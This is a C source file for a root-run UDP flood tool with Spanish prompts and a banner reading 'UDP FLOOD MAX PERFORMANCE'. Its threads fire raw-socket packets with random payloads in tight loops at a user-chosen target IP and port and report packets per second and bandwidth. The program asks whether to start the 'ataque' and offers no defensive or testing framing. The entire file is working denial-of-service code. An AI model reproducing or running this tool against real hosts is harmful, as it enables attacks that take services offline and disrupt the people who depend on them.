#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>
#include <stdatomic.h>
#include <sys/time.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <linux/if_ether.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <ifaddrs.h>

#define MAX_PACKET_SIZE 65500
#define MAX_THREADS 8
#define BATCH_SIZE 512
#define SOCKET_POOL_SIZE 16

struct udp_packet {
    struct iphdr ip;
    struct udphdr udp;
    char payload[MAX_PACKET_SIZE - sizeof(struct iphdr) - sizeof(struct udphdr)];
};

atomic_long packet_count = 0;
volatile sig_atomic_t running = 1;
time_t start_time = 0;
int packet_size = 0;

// Obtener IP real de la interfaz
char* get_local_ip() {
    struct ifaddrs *ifaddr, *ifa;
    static char ip[INET_ADDRSTRLEN];
    
    if (getifaddrs(&ifaddr) == -1) return NULL;
    
    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == NULL) continue;
        if (ifa->ifa_addr->sa_family == AF_INET) {
            // Preferir eth0, enp0s3, eno1, etc.
            if (strstr(ifa->ifa_name, "eth") || strstr(ifa->ifa_name, "enp") || 
                strstr(ifa->ifa_name, "eno") || strstr(ifa->ifa_name, "ens")) {
                struct sockaddr_in *sa = (struct sockaddr_in *)ifa->ifa_addr;
                inet_ntop(AF_INET, &sa->sin_addr, ip, INET_ADDRSTRLEN);
                break;
            }
        }
    }
    
    freeifaddrs(ifaddr);
    return ip;
}

unsigned short checksum(void *b, int len) {
    unsigned short *buf = b;
    unsigned int sum = 0;
    
    for (; len > 1; len -= 2)
        sum += *buf++;
    if (len == 1)
        sum += *(unsigned char *)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return ~sum;
}

void show_banner() {
    printf("\033[31m");
    printf("███████╗██╗      ██████╗  ██████╗ ██████╗ \n");
    printf("██╔════╝██║     ██╔═══██╗██╔═══██╗██╔══██╗\n");
    printf("█████╗  ██║     ██║   ██║██║   ██║██║  ██║\n");
    printf("██╔══╝  ██║     ██║   ██║██║   ██║██║  ██║\n");
    printf("██║     ███████╗╚██████╔╝╚██████╔╝██████╔╝\n");
    printf("╚═╝     ╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝ \n");
    printf("\033[33m");
    printf("          UDP FLOOD MAX PERFORMANCE\n");
    printf("\033[36m          SIN IP SPOOFING - CORREGIDO\033[0m\n\n");
}

void* flood_worker(void* arg) {
    char** target_data = (char**)arg;
    char* target_ip = target_data[0];
    int target_port = atoi(target_data[1]);
    int thread_id = atoi(target_data[2]);
    
    // Obtener IP local real
    char* local_ip = get_local_ip();
    if (!local_ip) {
        printf("[Hilo %d] ERROR: No se pudo obtener IP local\n", thread_id);
        return NULL;
    }
    
    int socket_pool[SOCKET_POOL_SIZE];
    struct sockaddr_in dest_addr;
    
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(target_port);
    inet_pton(AF_INET, target_ip, &dest_addr.sin_addr);
    
    // Crear pool de sockets
    for (int i = 0; i < SOCKET_POOL_SIZE; i++) {
        socket_pool[i] = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
        if (socket_pool[i] < 0) {
            // Fallback a socket UDP normal si RAW falla
            socket_pool[i] = socket(AF_INET, SOCK_DGRAM, 0);
            if (socket_pool[i] < 0) {
                perror("Socket failed");
                continue;
            }
        }
        
        int optval = 1;
        int buf_size = 64 * 1024 * 1024;
        
        setsockopt(socket_pool[i], SOL_SOCKET, SO_SNDBUF, &buf_size, sizeof(buf_size));
        if (socket_pool[i] != -1) {
            setsockopt(socket_pool[i], IPPROTO_IP, IP_HDRINCL, &optval, sizeof(optval));
        }
        fcntl(socket_pool[i], F_SETFL, O_NONBLOCK);
    }
    
    // Crear paquete con IP REAL
    struct udp_packet* packet = malloc(sizeof(struct udp_packet));
    memset(packet, 0, sizeof(struct udp_packet));
    
    // Configurar IP header con IP REAL
    packet->ip.ihl = 5;
    packet->ip.version = 4;
    packet->ip.tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + packet_size);
    packet->ip.id = htons(rand());
    packet->ip.frag_off = 0;
    packet->ip.ttl = 64;
    packet->ip.protocol = IPPROTO_UDP;
    
    // ✅ IP ORIGEN REAL - SIN SPOOFING
    inet_pton(AF_INET, local_ip, &packet->ip.saddr);
    inet_pton(AF_INET, target_ip, &packet->ip.daddr);
    
    // Configurar UDP header
    packet->udp.source = htons(10000 + (thread_id * 1000) + rand() % 1000); // Puertos origen secuenciales
    packet->udp.dest = htons(target_port);
    packet->udp.len = htons(sizeof(struct udphdr) + packet_size);
    
    // Payload aleatorio
    for (int i = 0; i < packet_size; i++) {
        packet->payload[i] = rand() % 256;
    }
    
    printf("[Hilo %d] IP Origen: %s -> %s:%d\n", thread_id, local_ip, target_ip, target_port);
    
    struct timespec sleep_time;
    sleep_time.tv_sec = 0;
    sleep_time.tv_nsec = 1;
    
    int socket_index = 0;
    long long packets_sent = 0;
    
    while (running) {
        int current_socket = socket_pool[socket_index];
        
        for (int batch = 0; batch < BATCH_SIZE; batch++) {
            // Actualizar ID y puerto origen (sin cambiar IP)
            packet->ip.id = htons(rand());
            packet->ip.check = 0;
            packet->ip.check = checksum(&packet->ip, sizeof(struct iphdr));
            
            packet->udp.source = htons(10000 + (thread_id * 1000) + (batch % 1000));
            packet->udp.check = 0;
            
            sendto(current_socket, packet, sizeof(struct iphdr) + sizeof(struct udphdr) + packet_size, 
                  MSG_DONTWAIT, (struct sockaddr*)&dest_addr, sizeof(dest_addr));
            
            packets_sent++;
        }
        
        atomic_fetch_add(&packet_count, BATCH_SIZE);
        socket_index = (socket_index + 1) % SOCKET_POOL_SIZE;
        nanosleep(&sleep_time, NULL);
    }
    
    free(packet);
    for (int i = 0; i < SOCKET_POOL_SIZE; i++) {
        if (socket_pool[i] != -1) close(socket_pool[i]);
    }
    
    printf("[Hilo %d] Cerrado - %lld paquetes\n", thread_id, packets_sent);
    return NULL;
}

void* show_stats(void* arg) {
    long last_count = 0;
    struct timespec last_time, current_time;
    
    clock_gettime(CLOCK_MONOTONIC, &last_time);
    
    while (running) {
        sleep(2);
        
        clock_gettime(CLOCK_MONOTONIC, &current_time);
        long current_count = atomic_load(&packet_count);
        
        double elapsed = (current_time.tv_sec - last_time.tv_sec) + 
                        (current_time.tv_nsec - last_time.tv_nsec) / 1e9;
        
        if (elapsed > 0) {
            double pps = (current_count - last_count) / elapsed;
            double mbps = (pps * packet_size * 8) / 1000000;
            
            printf("\r[STATS] Paquetes: %'ld | PPS: %'.0f | BW: %.2f Mbps | Threads: %d", 
                   current_count, pps, mbps, MAX_THREADS);
            fflush(stdout);
        }
        
        last_count = current_count;
        last_time = current_time;
    }
    return NULL;
}

void signal_handler(int sig) {
    running = 0;
    printf("\n\n[!] Deteniendo ataque...\n");
    printf("[!] Total paquetes: %ld\n", atomic_load(&packet_count));
    exit(0);
}

void interactive_mode() {
    char target_ip[16];
    int target_port;
    
    printf("[?] IP objetivo: ");
    scanf("%15s", target_ip);
    
    printf("[?] Puerto objetivo: ");
    scanf("%d", &target_port);
    
    printf("[?] Tamaño payload (1-65000): ");
    scanf("%d", &packet_size);
    
    if (packet_size < 1 || packet_size > 65000) {
        printf("Error: Tamaño inválido\n");
        return;
    }
    
    char* local_ip = get_local_ip();
    printf("\n[!] Configuración CORREGIDA:\n");
    printf("   IP Origen REAL: %s\n", local_ip);
    printf("   Target: %s:%d\n", target_ip, target_port);
    printf("   Hilos: %d (SIN IP Spoofing)\n", MAX_THREADS);
    printf("   Tamaño paquete: %d bytes\n", packet_size);
    
    printf("\n[!] Iniciar ataque? (s/n): ");
    char confirm[10];
    scanf("%9s", confirm);
    
    if (strcmp(confirm, "s") != 0) {
        printf("Cancelado\n");
        return;
    }
    
    start_attack(target_ip, target_port);
}

void start_attack(char* target_ip, int target_port) {
    printf("\n[!] INICIANDO - IP REAL SIN SPOOFING\n");
    printf("[!] Los paquetes deberían llegar al destino\n");
    printf("[!] Ctrl+C para detener\n\n");
    
    start_time = time(NULL);
    signal(SIGINT, signal_handler);
    
    pthread_t stats_thread;
    pthread_create(&stats_thread, NULL, show_stats, NULL);
    pthread_detach(stats_thread);
    
    pthread_t threads[MAX_THREADS];
    
    for (int i = 0; i < MAX_THREADS; i++) {
        char** thread_data = malloc(3 * sizeof(char*));
        thread_data[0] = strdup(target_ip);
        
        char port_str[10];
        snprintf(port_str, sizeof(port_str), "%d", target_port);
        thread_data[1] = strdup(port_str);
        
        char thread_str[10];
        snprintf(thread_str, sizeof(thread_str), "%d", i);
        thread_data[2] = strdup(thread_str);
        
        if (pthread_create(&threads[i], NULL, flood_worker, thread_data) != 0) {
            perror("Error creando hilo");
        }
        pthread_detach(threads[i]);
    }
    
    while (running) {
        sleep(1);
    }
}

int main(int argc, char* argv[]) {
    srand(time(NULL));
    
    if (geteuid() != 0) {
        printf("ERROR: Necesitas ejecutar como root!\n");
        printf("Usa: sudo %s\n", argv[0]);
        return 1;
    }
    
    if (argc >= 3) {
        char* target_ip = argv[1];
        int target_port = atoi(argv[2]);
        packet_size = argc >= 4 ? atoi(argv[3]) : 512;
        start_attack(target_ip, target_port);
    } else {
        show_banner();
        interactive_mode();
    }
    
    return 0;
}
